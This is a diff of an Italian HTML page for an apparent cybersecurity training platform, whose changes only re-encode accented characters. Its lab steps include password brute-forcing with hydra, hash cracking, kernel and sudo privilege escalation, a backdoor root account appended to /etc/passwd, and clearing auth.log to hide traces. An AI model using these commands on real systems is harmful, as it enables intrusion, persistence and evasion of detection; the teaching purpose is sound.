@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+Ôªø<!DOCTYPE html>
 <html lang="it">
 <head>
   <meta charset="UTF-8">
@@ -49,7 +49,7 @@
             <a href="#">Strumenti ?</a>
             <div class="dropdown">
               <a href="security-check.html">URL / Website Security Check</a>
-              <a href="vulnerability-scanner.html">Scanner Vulnerabilit‡</a>
+              <a href="vulnerability-scanner.html">Scanner Vulnerabilit√†</a>
               <a href="dns-enumerator.html">DNS Records Enumerator</a>
               <a href="subdomain-finder.html">Subdomain Finder</a>
               <a href="ssl-analyzer.html">SSL Certificate Analyzer</a>
@@ -103,7 +103,7 @@
       <div style="background: rgba(0, 0, 0, 0.2); border-left: 3px solid #4dabe7; padding: 20px; border-radius: 4px; cursor: pointer;" onmouseover="this.style.boxShadow='0 0 15px rgba(77, 171, 247, 0.2)'" onmouseout="this.style.boxShadow='none'">
         <h3 style="color: #4dabe7; margin-bottom: 10px;">?? Lab 2: Vulnerability Scanning</h3>
         <p style="color: #b0b0b0; font-size: 0.9rem; margin: 8px 0;"><strong>Livello:</strong> Intermedio | ?? 3-4 ore | ???</p>
-        <p style="color: #d1d5db; margin: 10px 0; line-height: 1.6;">Usa OpenVAS/Nessus. Identifica e classifica vulnerabilit‡ secondo CVSS.</p>
+        <p style="color: #d1d5db; margin: 10px 0; line-height: 1.6;">Usa OpenVAS/Nessus. Identifica e classifica vulnerabilit√† secondo CVSS.</p>
         <button onclick="showLab('lab2')" style="background: rgba(77, 171, 247, 0.2); border: 1px solid #4dabe7; color: #4dabe7; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-weight: 600; width: 100%; margin-top: 12px;">Avvia Lab ?</button>
       </div>
       <div style="background: rgba(0, 0, 0, 0.2); border-left: 3px solid #4dabe7; padding: 20px; border-radius: 4px; cursor: pointer;" onmouseover="this.style.boxShadow='0 0 15px rgba(77, 171, 247, 0.2)'" onmouseout="this.style.boxShadow='none'">
@@ -160,21 +160,21 @@
           title: "?? Lab 2: Vulnerability Scanning",
           difficulty: "Intermedio | ???",
           time: "3-4 ore",
-          objectives: ["Setup scanner di vulnerabilit‡", "Configurare scan", "Interpretare risultati CVSS"],
+          objectives: ["Setup scanner di vulnerabilit√†", "Configurare scan", "Interpretare risultati CVSS"],
           prerequisites: ["OpenVAS installato (o Nessus trial)", "Target vulnerabile (DVWA)", "Credenziali di accesso opzionali"],
           steps: [
             {title: "Step 1: Installa OpenVAS", content: "Su Kali: <code>sudo apt update && sudo apt install openvas</code>. Oppure accedi a versione cloud: https://www.openvas.org/. Avvia servizio: <code>sudo gvm-start</code>"},
             {title: "Step 2: Accedi Interfaccia", content: "Apri browser su localhost:9392. Login (default: admin/admin). Cambia password."},
             {title: "Step 3: Crea Target", content: "Menu ? Tasks ? Targets ? New Target. Inserisci IP target (es. 192.168.1.100). Save."},
             {title: "Step 4: Configura Task Scan", content: "Tasks ? New Task. Seleziona target. Scegli scanner config (Full and fast)."},
-            {title: "Step 5: Esegui Scan", content: "Clicca Play. Aspetta (puÚ durare 30min+). Monitor progress nella dashboard."},
-            {title: "Step 6: Analizza Risultati", content: "Al termine, visualizza report. Vulnerabilit‡ colorate: Rosso (High/Critical), Arancio (Medium), Blu (Low). Ogni vulnerabilit‡ ha: CVSS score, descrizione, CVE, fix."},
-            {title: "Step 7: Filtra per Gravit‡", content: "Clicca 'Severity' per ordinare. Inizia da Critical (CVSS 9.0-10.0). Leggi details e references."}
+            {title: "Step 5: Esegui Scan", content: "Clicca Play. Aspetta (pu√≤ durare 30min+). Monitor progress nella dashboard."},
+            {title: "Step 6: Analizza Risultati", content: "Al termine, visualizza report. Vulnerabilit√† colorate: Rosso (High/Critical), Arancio (Medium), Blu (Low). Ogni vulnerabilit√† ha: CVSS score, descrizione, CVE, fix."},
+            {title: "Step 7: Filtra per Gravit√†", content: "Clicca 'Severity' per ordinare. Inizia da Critical (CVSS 9.0-10.0). Leggi details e references."}
           ],
-          expectedOutput: "Report vulnerabilit‡ con tabella: Vulnerability | Hosts | Severity | CVSS | CVE. Esempio: 'Outdated Apache' | 192.168.1.100 | High | 7.5 | CVE-2021-33193",
+          expectedOutput: "Report vulnerabilit√† con tabella: Vulnerability | Hosts | Severity | CVSS | CVE. Esempio: 'Outdated Apache' | 192.168.1.100 | High | 7.5 | CVE-2021-33193",
           challenges: [
-            {title: "Challenge 1: False Positives", content: "Non tutte le vulnerabilit‡ sono reali. Verifica manualmente (es. port 'open' potrebbe essere firewall che risponde). Usa credenziali per authenticated scan = meno falsi positivi."},
-            {title: "Challenge 2: Lentezza Scan", content: "Se troppo lento, usa 'Full and fast' anzichÈ 'Full'. O sceglie 'Ping only' per scout veloce."},
+            {title: "Challenge 1: False Positives", content: "Non tutte le vulnerabilit√† sono reali. Verifica manualmente (es. port 'open' potrebbe essere firewall che risponde). Usa credenziali per authenticated scan = meno falsi positivi."},
+            {title: "Challenge 2: Lentezza Scan", content: "Se troppo lento, usa 'Full and fast' anzich√© 'Full'. O sceglie 'Ping only' per scout veloce."},
             {title: "Challenge 3: Interpretare CVSS", content: "CVSS 8.5 = Attack Vector: Network, Attack Complexity: Low, Privileges Required: None = facile sfruttare. Leggi details."}
           ],
           references: ["CVSS Calculator (first.org)", "OWASP Vulnerability Database", "NVD.NIST.GOV"]
@@ -214,14 +214,14 @@
             {title: "Step 3: Web Form Attack", content: "Target: DVWA login (http://localhost/login.php). Comando: <code>hydra -l admin -P rockyou.txt http-post-form '192.168.1.100:/login.php:username=^USER^&password=^PASS^:F=Login failed'</code>. F=Failed indicator."},
             {title: "Step 4: Estrai Hash da Documento", content: "Es. PDF con password. Usa: <code>pdftotext file.pdf > output.txt</code>. O hash di Windows SAM: <code>samdump2 SYSTEM SAM > hashes.txt</code>"},
             {title: "Step 5: Cracking Hash con John", content: "Formato: <code>john --format=md5 hashes.txt</code> (John rileva formato automatico). Output: plaintext password finding."},
-            {title: "Step 6: GPU Cracking con Hashcat", content: "Pi˘ veloce per hash complessi: <code>hashcat -m 0 hashes.txt rockyou.txt</code> (m=0 MD5). Monitor: <code>hashcat -m 0 hashes.txt rockyou.txt -O --workload-profile=4</code>"},
+            {title: "Step 6: GPU Cracking con Hashcat", content: "Pi√π veloce per hash complessi: <code>hashcat -m 0 hashes.txt rockyou.txt</code> (m=0 MD5). Monitor: <code>hashcat -m 0 hashes.txt rockyou.txt -O --workload-profile=4</code>"},
             {title: "Step 7: Rainbow Tables", content: "Precomputed hashes (molto veloci). Download: freerainbowtables.com. Usa: <code>rainbowcrack hashes.txt rainbowtable.rt</code>. Milliseconds per match."}
           ],
           expectedOutput: "Cracked passwords con tempo impiegato. Esempio: 'admin:password123 found in 45 seconds' o 'hash d41d8cd98f00b204e9800998ecf8427e cracked to password123'",
           challenges: [
             {title: "Challenge 1: Rate Limiting", content: "Server potrebbe limitare tentativi. Usa: <code>hydra -l admin -P rockyou.txt -W 2 ssh://192.168.1.100</code> (2 sec delay tra tentativi)."},
-            {title: "Challenge 2: Salted Hash", content: "Hash con salt = molto pi˘ lento. Rockyou.txt non contiene salt. Cerca online hash-salt combo o usa regole John."},
-            {title: "Challenge 3: Rare Password", content: "Se password non in rockyou.txt, prova: custom wordlist, pattern-based (es. Password1!), o rainbow table pi˘ grande."}
+            {title: "Challenge 2: Salted Hash", content: "Hash con salt = molto pi√π lento. Rockyou.txt non contiene salt. Cerca online hash-salt combo o usa regole John."},
+            {title: "Challenge 3: Rare Password", content: "Se password non in rockyou.txt, prova: custom wordlist, pattern-based (es. Password1!), o rainbow table pi√π grande."}
           ],
           references: ["OWASP Password Attacks", "CWE-521: Weak Password", "Hashcat Manual"]
         },
@@ -236,14 +236,14 @@
             {title: "Step 2: Trova Kernel Exploit", content: "Se kernel vulnerabile (es. Linux 4.8.0): <code>searchsploit linux 4.8.0</code>. Scarica exploit C, compila: <code>gcc -o exploit exploit.c</code>"},
             {title: "Step 3: Esegui Kernel Exploit", content: "Transfer exploit a target via SCP o curl. Esegui: <code>./exploit</code>. Output: root shell se vulnerabile."},
             {title: "Step 4: Sudo Abuse", content: "Se <code>sudo -l</code> mostra binari: <code>sudo /usr/bin/find . -exec /bin/sh \\;</code> (find con sh). Output: root shell senza password."},
-            {title: "Step 5: SUID Binary Exploitation", content: "Find SUID binaries: <code>find / -perm -4000 2>/dev/null</code>. Testa vulnerabilit‡: <code>strings /usr/bin/binary</code> cerca LD_PRELOAD abuse."},
+            {title: "Step 5: SUID Binary Exploitation", content: "Find SUID binaries: <code>find / -perm -4000 2>/dev/null</code>. Testa vulnerabilit√†: <code>strings /usr/bin/binary</code> cerca LD_PRELOAD abuse."},
             {title: "Step 6: Cron Job Exploitation", content: "Check cron: <code>cat /etc/crontab</code>. Se script non ha full path, plant malicious binary in PATH."},
             {title: "Step 7: Persistence (Backdoor)", content: "Aggiungi entry /etc/passwd: <code>echo 'hacker:x:0:0:::/bin/bash' >> /etc/passwd</code>. Cambia password root sudoedit."}
           ],
           expectedOutput: "root# shell prompt. Verifica con: <code>id</code> = 'uid=0(root)'. Backdoor creato = accesso permanente anche se patched."},
           challenges: [
             {title: "Challenge 1: Nessun Exploit Diretto", content: "Se kernel non vulnerabile, prova: misconfigured sudo, weak file permissions, cron jobs, library hijacking via LD_LIBRARY_PATH."},
-            {title: "Challenge 2: Protections", content: "ASLR/DEP attivi = exploit pi˘ difficile. Disabilita (se lab): <code>echo 0 > /proc/sys/kernel/randomize_va_space</code>"},
+            {title: "Challenge 2: Protections", content: "ASLR/DEP attivi = exploit pi√π difficile. Disabilita (se lab): <code>echo 0 > /proc/sys/kernel/randomize_va_space</code>"},
             {title: "Challenge 3: Detectability", content: "Logs registrano accesso. Per stealth: pulisci logs: <code>cat /dev/null > /var/log/auth.log</code> (richiede root)."}
           ],
           references: ["HackTheBox WriteUps", "Exploit-DB", "Linux Privilege Escalation"]
@@ -260,15 +260,15 @@
             {title: "Phase 3: Scanning (1-2h)", content: "Nmap completo: <code>nmap -A -T4 -p- -oA output target.com</code>. Individua: porte, servizi, versioni, OS."},
             {title: "Phase 4: Enumeration (1-2h)", content: "Service-specific: SMB (<code>enum4linux</code>), SNMP, LDAP. Web apps: <code>nikto -h http://target</code>, directory brute: <code>dirsearch -u http://target</code>"},
             {title: "Phase 5: Vulnerability Assessment (1-2h)", content: "OpenVAS scan completo. Manual testing: Burp Suite, Metasploit scanner. Prioritizza per CVSS score."},
-            {title: "Phase 6: Exploitation (2-3h)", content: "Sfrutta vulnerabilit‡ trovate. Inizio easy (default credentials), poi hard (custom exploit). Documenta proof-of-concept per ogni."},
+            {title: "Phase 6: Exploitation (2-3h)", content: "Sfrutta vulnerabilit√† trovate. Inizio easy (default credentials), poi hard (custom exploit). Documenta proof-of-concept per ogni."},
             {title: "Phase 7: Post-Exploitation (1-2h)", content: "Lateral movement, privilege escalation, data exfiltration. Plant persistence. Simula attaccante interno."},
-            {title: "Phase 8: Reporting (1-2h)", content: "Crea report professionale: Executive Summary, Vulnerabilit‡ (con PoC), Impatto, Raccomandazioni. Include screenshots, timeline, CVE references."}
+            {title: "Phase 8: Reporting (1-2h)", content: "Crea report professionale: Executive Summary, Vulnerabilit√† (con PoC), Impatto, Raccomandazioni. Include screenshots, timeline, CVE references."}
           ],
-          expectedOutput: "Report penetration test completo (20-50 pagine). Tabella vulnerabilit‡ con CVSS, impact, remediation. PoC per ogni find. Timeline attacco. Executive summary: 'Critical risk: RCE via Apache struts, root compromise possible'",
+          expectedOutput: "Report penetration test completo (20-50 pagine). Tabella vulnerabilit√† con CVSS, impact, remediation. PoC per ogni find. Timeline attacco. Executive summary: 'Critical risk: RCE via Apache struts, root compromise possible'",
           challenges: [
             {title: "Challenge 1: Time Management", content: "8-10h limitati. Prioritizza: impatto alto prima. Non spendere 2h su low-risk findings."},
             {title: "Challenge 2: Complexity", content: "Target complesso = multi-layer exploitation. Documenta ogni step: altrimenti non ricorderai come arrivato a root."},
-            {title: "Challenge 3: Stealth vs Speed", content: "Logging attivo = traces. Balance: velocit‡ vs evitare detection. Logs importanti per post-breach investigation."}
+            {title: "Challenge 3: Stealth vs Speed", content: "Logging attivo = traces. Balance: velocit√† vs evitare detection. Logs importanti per post-breach investigation."}
           ],
           references: ["PTES Penetration Testing Framework", "NIST SP 800-115", "Real-world PT reports (HackTheBox writeups)"]
         }
@@ -290,7 +290,7 @@
           <section style="margin-top: 30px;">
             <h3 style="color: #4dabe7; font-size: 1.3rem; margin-bottom: 15px;">Prerequisites</h3>
             <ul style="color: #d1d5db;">`;
-        lab.prerequisites.forEach(req => { html += `<li>ï ${req}</li>`; });
+        lab.prerequisites.forEach(req => { html += `<li>‚Ä¢ ${req}</li>`; });
         html += `</ul></section>
           
           <section style="margin-top: 30px;">
@@ -353,7 +353,7 @@
         <div class="footer-text">EVIL aggrega dati pubblicamente disponibili, CVE ufficiali e simulazioni controllate. Finalizzato a ricerca, formazione professionale e valutazione della sicurezza.</div>
       </div>
       <div class="footer-right">
-        <div class="footer-label">© 2026</div>
+        <div class="footer-label">¬© 2026</div>
         <div class="footer-text">EVIL Cybersecurity Platform | <a href="https://github.com" style="color: #00ff9c; text-decoration: none;">GitHub</a></div>
       </div>
     </div>
@@ -384,6 +384,7 @@
   <script src="/js/js.js"></script>
 </body>
 </html>
+
 
 
 
